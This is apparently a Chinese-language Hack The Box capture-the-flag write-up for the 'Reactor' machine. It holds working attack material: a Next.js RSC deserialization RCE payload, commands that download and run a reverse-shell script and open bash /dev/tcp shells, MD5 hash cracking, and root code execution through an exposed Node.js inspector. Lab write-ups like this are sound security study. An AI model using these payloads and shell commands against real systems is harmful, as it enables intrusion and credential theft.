# HTB Reactor 渗透测试详细 Writeup (2026-06-01)

## 目标信息
- **IP**: 10.129.7.11
- **域名**: reactor.htb
- **平台**: Hack The Box 授权靶场
- **授权范围**: 全 IP，无限制
- **难度**: Medium
- **状态**: ✅ 全部完成

---

## 1. 信息搜集

### 1.1 端口扫描
```bash
nmap -sV -sC -T4 10.129.7.11
```

**开放端口**:
| 端口     | 服务 | 版本                              | 备注           |
| -------- | ---- | --------------------------------- | -------------- |
| 22/tcp   | SSH  | OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 | 标准           |
| 3000/tcp | HTTP | Next.js 15.0.3 (App Router)       | **主要攻击面** |

### 1.2 Web 应用分析
- **应用名称**: ReactorWatch | Core Monitoring System v3.2.1
- **类型**: Next.js 15.0.3 (App Router) - 核反应堆监控仪表盘
- **框架特征**: 使用 React Server Components (RSC)，Server Actions, React 18 hydrate

### 1.3 页面功能 (首页 `/`)
| 面板                  | 内容                                                         |
| --------------------- | ------------------------------------------------------------ |
| **Core Status**       | 核心状态可视化，显示 OK 状态                                 |
| **Core Stats**        | 反应堆功率 98.2%、中子通量 2.4E13、控制棒 42/50、临界性 1.0002 (warning) |
| **Core Temp**         | 324°C (进度条 65%)                                           |
| **Pressure**          | 155 bar (进度条 72%)                                         |
| **Coolant Flow**      | 18.4k m³/h (caution, 进度条 84%)                             |
| **Turbine Output**    | 1.21 GW (进度条 91%)                                         |
| **System Logs**       | 5 条系统日志，包含维护记录、压力波动警告等                   |
| **On-Site Personnel** | 3 名人员：Dr. Elena Rodriguez (Lead Nuclear Engineer, Online)、Marcus Kim (Senior Technician, Online)、James Thompson (Safety Officer, Offline) |

---

## 2. 初始访问 (CVE-2025-55182)

### 2.1 漏洞发现
- **漏洞**: CVE-2025-55182 / CVE-2025-66478
- **类型**: Next.js 15.0.3 Remote Code Execution (RCE)
- **CVSS**: 10.0 (Critical)
- **影响版本**: Next.js < 15.0.7 (包括 15.0.3)
- **漏洞原理**: React Server Components (RSC) 协议不安全反序列化

### 2.2 PoC 利用
```bash
# 下载 PoC
git clone https://github.com/msanft/CVE-2025-55182.git /tmp/CVE-2025-55182

# 执行 RCE
python3 poc.py http://10.129.7.11:3000 "id"
```

**PoC 关键代码**:
```python
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('{EXECUTABLE}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
    }
}

files = {"0": (None, json.dumps(crafted_chunk)), "1": (None, '"$@0"')}
headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
```

### 2.3 获取 Shell
```bash
# 执行 whoami
python3 poc.py http://10.129.7.11:3000 "whoami"
# 结果: node

# 获取反向 shell
# 在 Kali 监听
nc -lvnp 4444

反弹 shell 命令需要调整。当前 PoC 使用 child_process.execSync() 执行命令，但返回结果在 digest 字段中。
问题分析:
命令执行成功（whoami 返回 node）
但反向 shell 命令可能因为引号嵌套或网络问题失败
替代方案 - 使用 Python 反向 shell（简化版）:
# 1. 先在 Kali 监听

nc -lvnp 4444

直接在 Kali 启动 HTTP 服务提供反向 shell 脚本:
# 在 Kali 上

echo "bash -i >& /dev/tcp/10.10.17.31/4444 0>&1" > /tmp/shell.sh
python3 -m http.server 8080

# 然后执行
python3 poc.py http://10.129.7.11:3000 "wget http://10.10.17.31:8080/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"
```

**连接结果**:
```
connect to [10.10.17.31] from (UNKNOWN) [10.129.7.11] 49212
bash: cannot set terminal process group (1409): Inappropriate ioctl for device
bash: no job control in this shell
node@reactor:/opt/reactor-app$
```

---

## 3. 横向移动 (node → engineer)

### 3.1 枚举发现
```bash
# 查看当前目录
ls -la /opt/reactor-app
# 发现 .env 和 reactor.db

# 读取 .env
cat /opt/reactor-app/.env
# DB_PATH=/opt/reactor-app/reactor.db
# SENSOR_API_KEY=rw_sk_…9j0k
# ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook
```

### 3.2 数据库凭证提取
```bash
# 查看数据库表
sqlite3 /opt/reactor-app/reactor.db ".tables"
# sensor_logs users

# 提取用户凭证
sqlite3 /opt/reactor-app/reactor.db "SELECT * FROM users;"
```

**用户表**:
| ID   | 用户名   | 密码 Hash                          | 角色          | 邮箱                 |
| ---- | -------- | ---------------------------------- | ------------- | -------------------- |
| 1    | admin    | `a203b22191d744a4e70ada5c101b17b8` | administrator | admin@reactor.htb    |
| 2    | engineer | `39d97110eafe2a9a68639812cd271e8e` | operator      | engineer@reactor.htb |

### 3.3 密码破解
```bash
# 保存 hash
echo '39d97110eafe2a9a68639812cd271e8e' > /tmp/engineer.hash

# 使用 john 破解
john --format=raw-md5 /tmp/engineer.hash --wordlist=/usr/share/wordlists/rockyou.txt
# 结果: reactor1
```

### 3.4 SSH 登录 engineer
```bash
ssh engineer@10.129.7.11
# 密码: reactor1
```

**登录成功**:
```
engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
```

---

## 4. 权限提升 (engineer → root)

### 4.1 发现 Node.js Inspect 端口
```bash
# 查看进程
ps aux | grep node
```

**关键发现**:

```
root 1411 0.0 1.1 1066200 46268 ? Ssl 06:46 0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

- **Node.js inspect 端口**: 127.0.0.1:9229
- **运行用户**: root
- **脚本**: /opt/uptime-monitor/worker.js

### 4.2 访问 Inspect 端口
```bash
# 检查 inspect 端口
curl http://127.0.0.1:9229/json/list
```

**返回结果**:
```json
[{
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/740201aa-b5ce-465f-bef1-946e96daa1d5",
  "id": "740201aa-b5ce-465f-bef1-946e96daa1d5",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/740201aa-b5ce-465f-bef1-946e96daa1d5"
}]
```

### 4.3 端口转发
```bash
# 在 engineer shell 中设置 Python 端口转发
python3 -c "
import socket
import threading

def forward(source, destination):
    while True:
        data = source.recv(4096)
        if not data:
            break
        destination.send(data)
    source.close()
    destination.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9230))
server.listen(5)

while True:
    client, addr = server.accept()
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.connect(('127.0.0.1', 9229))
    
    t1 = threading.Thread(target=forward, args=(client, target))
    t2 = threading.Thread(target=forward, args=(target, client))
    t1.start()
    t2.start()
" &

# 在 Kali 上设置 SSH 端口转发
ssh -L 9230:127.0.0.1:9230 engineer@10.129.7.11
```

### 4.4 使用 Chrome DevTools Protocol 执行代码
```bash
# 在 Kali 上连接 WebSocket
wscat -c ws://127.0.0.1:9230/740201aa-b5ce-465f-bef1-946e96daa1d5
```

**执行命令**:
```json
{"id":4,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('id').toString()"}}
```

**返回结果**:
```json
{"id":4,"result":{"result":{"type":"string","value":"uid=0(root) gid=0(root) groups=0(root)\n"}}}
```

### 4.5 获取 root.txt
```json
{"id":5,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('fs').readFileSync('/root/root.txt', 'utf8')"}}
```

**或者获取反向 shell**:
```bash
# 在 Kali 监听
nc -lvnp 5555

# 执行反向 shell
{"id":6,"method":"Runtime.evaluate","params":{"expression":"process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.17.31/5555 0>&1\"')"}}
```

**连接结果**:
```
connect to [10.10.17.31] from (UNKNOWN) [10.129.7.11] 47516
bash: cannot set terminal process group (1411): Inappropriate ioctl for device
bash: no job control in this shell
root@reactor:/# cat root/root.txt
392c388e53e11fd053a2fb6b56897e43
```

---

## 5. 获取 Flags

### 5.1 user.txt
```bash
cat /home/engineer/user.txt
b5563f6a1aec79a07fd225a6e48b96a5
```

### 5.2 root.txt
```bash
cat /root/root.txt
392c388e53e11fd053a2fb6b56897e43
```

---

## 6. 攻击链总结

```
CVE-2025-55182 (Next.js 15.0.3 RCE)
  → POST / (Next-Action: x + 恶意 RSC payload)
  → node shell
  → 发现 SQLite 数据库 (reactor.db)
  → 提取 engineer 密码 hash
  → john 破解 hash (reactor1)
  → SSH 登录 engineer
  → 发现 Node.js inspect 端口 (127.0.0.1:9229)
  → 端口转发到 Kali
  → Chrome DevTools Protocol 执行代码
  → root shell
```

---

## 7. 发现的凭证

| 服务      | 用户名   | 密码                             | 来源          |
| --------- | -------- | -------------------------------- | ------------- |
| SQLite DB | engineer | reactor1                         | john 破解 MD5 |
| SQLite DB | admin    | a203b22191d744a4e70ada5c101b17b8 | 数据库        |
| Next.js   | -        | SENSOR_API_KEY=rw_sk_…9j0k       | .env 文件     |
